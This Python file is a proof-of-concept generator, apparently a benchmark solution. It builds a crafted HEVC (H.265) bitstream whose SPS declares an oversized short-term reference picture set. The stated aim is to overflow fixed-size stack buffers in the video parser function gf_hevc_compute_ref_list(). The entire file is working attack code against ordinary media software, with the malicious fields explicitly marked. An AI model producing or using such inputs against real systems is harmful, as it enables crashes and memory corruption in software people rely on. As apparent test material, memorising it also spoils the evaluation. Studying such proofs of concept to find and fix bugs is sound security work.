import sys

class Solution:
    """
    Generates a Proof-of-Concept input that triggers a Stack Buffer Overflow
    in the gf_hevc_compute_ref_list() function.
    
    The vulnerability is caused by insufficient checks when processing a
    Short-Term Reference Picture Set (RPS) from an HEVC bitstream.
    Specifically, the number of pictures in the RPS can be larger than
    the fixed-size stack buffers used to store their information.

    The PoC consists of a minimal raw HEVC (H.265) Annex B bitstream
    containing four NAL units:
    1. VPS (Video Parameter Set): Basic video configuration.
    2. SPS (Sequence Parameter Set): Contains the malicious RPS. We configure
       it to allow a large number of reference pictures and then define an
       RPS with more pictures (e.g., 20) than the stack buffer size (16).
    3. PPS (Picture Parameter Set): Links to the SPS.
    4. Slice Header: A P-slice that references and activates the malicious
       RPS defined in the SPS. This triggers the call to the vulnerable
       function `gf_hevc_compute_ref_list`, which then overflows its stack
       buffers while processing the oversized RPS.
    """

    class BitStream:
        """Helper class to write data bit-by-bit."""
        def __init__(self):
            self.buffer = bytearray()
            self.byte = 0
            self.bit_pos = 0

        def write_bit(self, bit: int):
            if bit:
                self.byte |= (1 << (7 - self.bit_pos))
            self.bit_pos += 1
            if self.bit_pos == 8:
                self.buffer.append(self.byte)
                self.byte = 0
                self.bit_pos = 0

        def write_bits(self, value: int, n: int):
            for i in range(n):
                bit = (value >> (n - 1 - i)) & 1
                self.write_bit(bit)

        def write_ue(self, value: int): # Unsigned Exp-Golomb
            temp = value + 1
            num_bits = temp.bit_length()
            leading_zeros = num_bits - 1
            
            self.write_bits(0, leading_zeros)
            self.write_bits(temp, num_bits)

        def write_se(self, value: int): # Signed Exp-Golomb
            if value <= 0:
                uv = -2 * value
            else:
                uv = 2 * value - 1
            self.write_ue(uv)

        def byte_align(self):
            if self.bit_pos > 0:
                self.write_bit(1)
                while self.bit_pos != 0:
                    self.write_bit(0)
        
        def get_bytes(self) -> bytes:
            # Finalize buffer if it's not byte-aligned
            if self.bit_pos > 0:
                self.buffer.append(self.byte)
            return bytes(self.buffer)

    def solve(self, src_path: str) -> bytes:
        start_code = b'\x00\x00\x00\x01'
        
        # The stack buffers in the vulnerable function have a size of 16.
        # We use a value > 16 to trigger the overflow.
        VULN_COUNT = 20

        # NAL Unit Types
        NAL_VPS = 32
        NAL_SPS = 33
        NAL_PPS = 34
        NAL_TRAIL_R = 1 # P-Slice

        # Create NAL unit payloads
        vps_payload = self._create_vps()
        sps_payload = self._create_sps(VULN_COUNT)
        pps_payload = self._create_pps()
        slice_payload = self._create_slice()

        # Assemble the final Annex B bitstream
        poc = bytearray()
        poc.extend(start_code + self._nal_header(NAL_VPS) + vps_payload)
        poc.extend(start_code + self._nal_header(NAL_SPS) + sps_payload)
        poc.extend(start_code + self._nal_header(NAL_PPS) + pps_payload)
        poc.extend(start_code + self._nal_header(NAL_TRAIL_R) + slice_payload)
        
        return bytes(poc)

    def _nal_header(self, nal_type: int) -> bytes:
        # F=0 (1b), Type (6b), LayerId=0 (6b), TID=1 (3b)
        val = (nal_type << 9) | 1
        return val.to_bytes(2, 'big')

    def _create_vps(self) -> bytes:
        bs = self.BitStream()
        bs.write_bits(0, 4)       # vps_video_parameter_set_id
        bs.write_bits(3, 2)       # vps_reserved_three_2bits
        bs.write_bits(0, 6)       # vps_max_layers_minus1
        bs.write_bits(0, 3)       # vps_max_sub_layers_minus1
        bs.write_bit(1)           # vps_temporal_id_nesting_flag
        bs.write_bits(0xFFFF, 16) # vps_reserved_0xffff_16bits
        
        # profile_tier_level (Main Profile)
        bs.write_bits(0, 2)       # general_profile_space
        bs.write_bit(0)           # general_tier_flag
        bs.write_bits(1, 5)       # general_profile_idc
        bs.write_bits(0, 32)      # general_profile_compatibility_flags
        bs.write_bits(0, 48)      # constraint flags, etc.
        bs.write_bits(0, 8)       # general_level_idc

        bs.write_bit(0)           # vps_sub_layer_ordering_info_present_flag
        bs.write_ue(0)            # vps_max_dec_pic_buffering_minus1
        bs.write_ue(0)            # vps_max_num_reorder_pics
        bs.write_ue(0)            # vps_max_latency_increase_plus1

        bs.write_bits(0, 6)       # vps_max_layer_id
        bs.write_ue(0)            # vps_num_layer_sets_minus1
        bs.write_bit(0)           # vps_timing_info_present_flag
        bs.write_bit(0)           # vps_extension_flag
        bs.byte_align()
        return bs.get_bytes()

    def _create_sps(self, vuln_count: int) -> bytes:
        bs = self.BitStream()
        bs.write_bits(0, 4)       # sps_video_parameter_set_id
        bs.write_bits(0, 3)       # sps_max_sub_layers_minus1
        bs.write_bit(1)           # sps_temporal_id_nesting_flag
        
        # profile_tier_level (same as VPS)
        bs.write_bits(0, 2); bs.write_bit(0); bs.write_bits(1, 5)
        bs.write_bits(0, 32); bs.write_bits(0, 48); bs.write_bits(0, 8)

        bs.write_ue(0)            # sps_seq_parameter_set_id
        bs.write_ue(1)            # chroma_format_idc
        bs.write_bit(0)           # separate_colour_plane_flag
        bs.write_ue(352)          # pic_width_in_luma_samples
        bs.write_ue(288)          # pic_height_in_luma_samples
        bs.write_bit(0)           # conformance_window_flag
        bs.write_ue(0)            # bit_depth_luma_minus8
        bs.write_ue(0)            # bit_depth_chroma_minus8
        bs.write_ue(4)            # log2_max_pic_order_cnt_lsb_minus4
        bs.write_bit(0)           # sps_sub_layer_ordering_info_present_flag
        
        # This value must be >= vuln_count for the RPS to be valid.
        bs.write_ue(vuln_count)   # sps_max_dec_pic_buffering_minus1
        bs.write_ue(0)            # sps_max_num_reorder_pics
        bs.write_ue(0)            # sps_max_latency_increase_plus1
        
        bs.write_ue(0); bs.write_ue(3); bs.write_ue(0); bs.write_ue(3) # log2 params
        bs.write_ue(0); bs.write_ue(0) # transform hierarchy
        bs.write_bit(0); bs.write_bit(0); bs.write_bit(0); bs.write_bit(0) # flags
        
        # Malicious RPS definition
        bs.write_ue(1)            # num_short_term_ref_pic_sets
        bs.write_bit(0)           # inter_ref_pic_set_prediction_flag
        bs.write_ue(vuln_count)   # num_negative_pics
        bs.write_ue(0)            # num_positive_pics
        for i in range(vuln_count):
            bs.write_ue(i)        # delta_poc_s0_minus1
            bs.write_bit(1)       # used_by_curr_pic_s0_flag
            
        bs.write_bit(0)           # long_term_ref_pics_present_flag
        bs.write_bit(0)           # sps_temporal_mvp_enabled_flag
        bs.write_bit(0)           # strong_intra_smoothing_enabled_flag
        bs.write_bit(0)           # vui_parameters_present_flag
        bs.write_bit(0)           # sps_extension_present_flag
        bs.byte_align()
        return bs.get_bytes()

    def _create_pps(self) -> bytes:
        bs = self.BitStream()
        bs.write_ue(0); bs.write_ue(0); bs.write_bit(0); bs.write_bit(0)
        bs.write_bits(0, 3); bs.write_bit(0); bs.write_bit(0); bs.write_ue(0)
        bs.write_ue(0); bs.write_se(0); bs.write_bit(0); bs.write_bit(0)
        bs.write_bit(0); bs.write_se(0); bs.write_se(0); bs.write_bit(0)
        bs.write_bit(0); bs.write_bit(0); bs.write_bit(0); bs.write_bit(0)
        bs.write_bit(0); bs.write_bit(0); bs.write_bit(0); bs.write_bit(0)
        bs.write_bit(0); bs.write_ue(0); bs.write_bit(0); bs.write_bit(0)
        bs.byte_align()
        return bs.get_bytes()

    def _create_slice(self) -> bytes:
        bs = self.BitStream()
        bs.write_bit(1)       # first_slice_segment_in_pic_flag
        bs.write_ue(0)        # slice_pic_parameter_set_id
        bs.write_ue(1)        # slice_type (P)
        # log2_max_pic_order_cnt_lsb_minus4=4 in SPS, so width is 4+4=8
        bs.write_bits(0, 8)   # slice_pic_order_cnt_lsb
        
        # Activate the RPS from the SPS
        bs.write_bit(1)       # short_term_ref_pic_set_sps_flag
        
        # Minimal remaining fields for a simple P-slice
        bs.write_ue(0)        # num_long_term_sps
        bs.write_ue(0)        # num_long_term_pics
        bs.write_bit(0)       # num_ref_idx_active_override_flag
        bs.write_bit(0)       # ref_pic_list_modification_flag_l0
        bs.write_se(0)        # slice_qp_delta
        
        # Minimal slice data: just the end of slice bit
        bs.byte_align()
        bs.write_bit(1)
        bs.byte_align()
        return bs.get_bytes()
